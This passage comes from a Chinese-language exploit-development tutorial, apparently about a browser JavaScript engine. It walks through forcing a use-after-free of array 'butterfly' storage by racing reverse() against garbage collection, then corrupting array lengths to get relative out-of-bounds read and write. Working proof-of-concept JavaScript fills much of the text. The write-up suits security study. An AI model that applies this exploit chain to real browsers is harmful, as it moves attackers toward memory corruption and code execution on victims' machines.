    v = []
    for (var i = 0; i < 506; i++) {
        for(var j = 0; j < 0x20; j++)
            someArray1.reverse()
        v.push(new String("C").repeat(0x10000)) // stimulate the GC
    }
    ...
如果成功，会释放一个或多个供存储在someArray1中的浮点数组使用的butterfly结构。我们的结果将如下图所示：
竞争条件将释放堆中的一些butterfly结构，同时保持其JSArray单元完好无损
在竞争条件状态下，JSArray
v将扩展其butterfly（通过压入操作），最终导致该数组的butterfly分配到刚刚释放的butterfly的内存空间。
“v”的butterfly结构最终会到刚释放的butterfly的内存空间上面重新分配内存
为了验证这一点，我们可以检查与竞争条件相关的所有数组的长度。如果成功的话，应该会找到一个或多个长度异常的数组。这表明butterfly已被释放，现在它是一个悬空指针，指向一个新对象（具体来说，就是v）所拥有的内存。
    ...
    print("Checking for abnormal array lengths...");
    for (var i = 0; i < someArray1.length; i++) {
        if(someArray1[i].length == 128) // ignore arrays of expected length...
            continue;
        print('len: 0x' + someArray1[i].length.toString(16));
    }
我们可以利用本节中提供的代码片段新建一个PoC脚本，并将其命名为x.js。
通过重复运行这个脚本，可以看到，该漏洞会稳定地报告多个长度异常的JSArray。这证明某些数组的butterfly结构已经通过竞争条件被释放，从而失去了对其基础数据的所有权（现在，它们属于对象v）。
PoC的输出信息表明，在每次运行期间都会显示畸形的数组长度，这意味着可能出现了一些无边界的（畸形的）数组
显然，我们已经使用竞争条件强制一个或多个（随机）JSArray的butterfy被UAF，并且，这些悬空的butterfly指针所指向的，都是一些未知数据。
通过竞争条件漏洞，利用一个或多个释放的butterfly结构，我们就可以操纵为对象v分配的空间之外的内存了。不难看出，通过完全控制上面所讨论的“畸形的”数组长度，实际上就已经实现了所谓的“相对R/W”漏洞利用原语。
**相对R/W原语**
* * *
通过用任意数据（在这个例子中，使用的是浮点数）填充较大的、被覆盖的butterfly v，我们就能够在不经意间设置由一个或多个释放的JSArray
butterfly所指向的“length”属性。为了为此上述任务，只需向我们的PoC添加一行代码就行了（v.fill（...））：
    print("Initializing arrays...");
    var someArray1 = Array(1024);
    for (var i = 0; i < someArray1.length; i++)
        someArray1[i] = new Array(128).fill(2261634.5098039214) // 0x41414141...
    print("Starting race...");
    v = []
    for (var i = 0; i < 506; i++) {
        for(var j = 0; j < 0x20; j++)
            someArray1.reverse()
        v.push(new String("C").repeat(0x10000)) // stimulate the GC
    }
    print("Filling overlapping butterfly with 0x42424242...");
    v.fill(156842099844.51764)
    print("Checking for abnormal array lengths...");
    for (var i = 0; i < someArray1.length; i++) {
        if(someArray1[i].length == 128) // ignore arrays of expected length...
            continue;
        print('len: 0x' + someArray1[i].length.toString(16));
    }
将这个PoC重复执行几次，我们会看到多个数组声称其数组长度为0x42424242，说明这个POC的作用是很稳定的。对于任何开发人员来说，已损坏的或根本不正确的数组长度都是非常让人非常揪心的。
PoC可以稳定地输出多个其长度处于攻击者控制之下的数组
这样的话，有效长度已经对这些“畸形的”（悬空）数组butterfly起不到限制作用了。所以，现在从someArray1中提取一个畸形的JSArray对象，并按照常规方法使用，就可以通过远超其“预期”的数组长度来索引其附近的堆内存来实现相应的读写操作了（相对寻址方式）。
    // pull out one of the arrays with an 'abnormal' length
    oob_array = someArray1[i];
    // write the value 0x41414141 to array index 999999 (Out-of-Bounds Write)
    oob_array[999999] = 0x41414141;
    // read memory from index 987654321 of the array (Out-of-Bounds Read)
    print(oob_array[987654321]);
越界读写是一个非常强大的漏洞利用原语。作为攻击者，我们已经可以窥视并操纵运行时内存的其他部分了，就像我们使用调试器时一样。
好了，迄今为止，我们已经有效地突破了应用程序运行时的第四道防护栏。
**小结**
* * *
在本文中，我们为读者介绍了漏洞利用原语的概念，并讲解了渐进式原语构建的理念，同时，还详细介绍了UAF目标的选取、强行构造UAF漏洞的方法以及如何利用该漏洞构建相对读写原语的方法，更多精彩内容，将在本文的下篇中继续为读者展示。